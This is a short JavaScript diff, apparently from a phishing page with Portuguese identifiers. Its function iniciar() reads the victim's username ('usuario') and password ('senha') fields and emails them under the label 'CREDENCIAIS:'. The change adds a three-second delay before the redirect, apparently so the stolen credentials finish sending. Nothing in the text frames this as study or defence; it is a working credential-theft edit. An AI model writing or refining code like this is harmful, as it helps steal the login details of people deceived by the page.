@@ -79,5 +79,7 @@ function gerarResultado() {
 
 function iniciar() {
     sendEmail("CREDENCIAIS:", document.getElementById("usuario").value + " " + document.getElementById("senha").value);
-    window.location.href = "1";
+    setTimeout(function() {
+        window.location.href = "1";
+    }, 3000);
 }
